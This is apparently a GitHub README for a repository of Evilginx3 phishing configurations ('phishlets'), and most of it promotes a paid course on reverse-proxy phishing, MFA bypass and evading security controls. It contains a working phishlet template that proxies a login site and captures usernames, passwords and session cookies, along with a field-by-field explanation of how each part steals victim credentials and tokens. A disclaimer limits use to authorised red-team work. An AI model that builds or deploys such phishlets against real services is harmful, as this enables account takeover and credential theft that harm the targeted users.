
# Updated Evilginx3 Phishlets
I've dedicated substantial time and effort to create and update new phishlets for Evilginx3. 
In this repository, you'll find many custom Evilginx phishlets, finely crafted and updated to suit real-world applications.

# Learn More: interested in mastering MITM Phishing with Evilginx?

## Enroll in our Evilginx 3.0 Professional Masterclass!

Our comprehensive course focuses on deploying Evilginx for dynamic phishing scenarios, students will master the nuances reverse-proxy phishing, email protocols (SPF, DMARC, DKIM), content obfuscation, and executing attacks that effectively evade security measures, ensuring a comprehensive grasp of modern attacks along with a vast archive of custom tools & templates to aid your campaigns.

### Grab the course here: www.simplerhacking.com/courses/evilginx-course

[![Evilginx Pro Masterclass](https://img.shields.io/badge/Evilginx-Professional%20Masterclass-darkred?style=for-the-badge&logo=github)](https://www.simplerhacking.com/courses/evilginx-course)



![Evilginx Pro](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/e8845e9f-d993-4c05-adac-d213073aba4c)

![preview](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/500f76e8-d1aa-4a79-9bbf-5fbec64003df)

![evilginx course bonus collection](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/54e990c9-77d8-4ae1-922d-043bc10957f9)


## Use Code: GITHUB20 for a 20% off of the course!
### About the course: 
Become an Evilginx professional & learn how to bypass modern MFA with the latest version Evilginx3, send verified campaigns, capture credentials, record & analyze campaign results. Get access to Phishlets not available on our public Github as well as tons of resources, templates & generators to aid your engagements.

### Course Previews:



![Evilginx Pro Course Preview](https://github.com/simplerhacking/Phishlet-Creator/assets/141525149/66bbf548-b340-4c91-8694-1f77209a5edb)

https://github.com/simplerhacking/Evilginx3-Tutorial/assets/141525149/fa7dcbf0-13cb-4cfc-b7a8-f944d824b0c2

![evilginx3 new course 3](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/389cadcc-4fa3-4859-89e8-0ce95af23f65)

![GAP94xaWkAA_iTl](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/231ed9c9-6170-4c21-9d4c-fb58ffeda325)



## Attend the Free Evilginx Modern Phishing Webinar: www.simplerhacking.com/courses/evilginx-webinar

Learn how attackers use Evilginx & other tools to bypass MFA & gain access to information. Learn how Modern Business Email Compromise (BEC), and Evilginx Man-in-the-Middle (MITM) attacks are done from an attacker's perspective.
  
## Need Custom Phishlets? 
Check our constantly updating our free Evilginx3 Phishlet Repository for Red Teams

You can find it here: https://github.com/simplerhacking/Evilginx3-Phishlets

## Questions?
## Send us an email to: info@simplerhacking.com 

## Simpler Hacking Evilginx Phishlet Template (Use this template to make your own!)

```yaml
name: 'Your First Phishlet'
author: 'Simpler Hacking'
min_ver: '3.2.0'

proxy_hosts:
  - { phish_sub: 'www', orig_sub: 'www', domain: '{domain}', session: true, is_landing: true }

sub_filters: 
  - { hostname: '{hostname}', sub: 'www', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']} 
  - { hostname: '{hostname}', sub: 'www', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['application/x-www-form-urlencoded']}

auth_tokens:
  - domain: '{domain}'
    keys: ['session']

creds:
  - key: 'username'
    search: ['(.*)']
    type: 'post'
  - key: 'password'
    search: ['(.*)']
    type: 'post'

auth_urls:
  - url_regex: 'https://{hostname}/login'
    valid_statuses: [200]

login:
  username: user
  password: pass
  url: https://www.{domain}/login

# This is just a demo example of a phishlet for 3.2.0

# You can find phishlets here: https://github.com/simplerhacking/Evilginx3-Phishlets

```
**Explanation of Phishlet Parameters:**

- `name:` Identifies the name of the phishlet.
- `author:` Specifies the phishlet author.
- `min_ver:` Specifies the minimum Evilginx version that is compatible with your phishlet.
- `proxy_hosts:` Indicates the domain and subdomains to proxy. The `phish_sub` is the subdomain that the phishing page will imitate.
- `sub_filters:` Allows the phishlet to replace instances of the actual domain name with the phishing domain, which is critical for the phishing page to function correctly.
- `auth_tokens:` Identifies the cookies that should be captured from the victim's browser to gain access to the victim's session.
- `creds:` This field determines the credentials that the phishlet is engineered to steal. The `key` is the name of the credential (like username or password) and `search` is a regular expression that the program will use to identify and extract these details from the user's input.
- `auth_urls:` Defines the URLs that Evilginx will treat as the authenticated URLs. After the victim logs in, Evilginx will look out for a redirect to one of these URLs, at which point it will steal the listed `auth_tokens`.
- `login:` Here you specify the identifiers of the username and password fields in the login form on the original webpage. The `url` is the link of the page where the victim enters their credentials.
- `force_post:` If set to true, it forces the alteration of HTTP method from GET to POST.
- `is_landing:` If set to true, it means that the page is a landing page for the phishing attack.
- `js_inject:` This is where you can write some JavaScript to be injected in the webpage. It's typically used to enhance the phishing attack and ensure a smoother victim experience.
- `domain:` This is a template variable used to replace target hostname used in phishlet configuration.

## Disclaimer
The tools here are intended solely for legal and ethical use by cybersecurity professionals in controlled environments. 
Any illegal or malicious use is strictly prohibited.
I disclaim all responsibility for any harm, loss, or damage that may arise from improper use.

<img src="https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/bde083c3-551d-4c05-961d-8e493731a273" width="750" height="450">
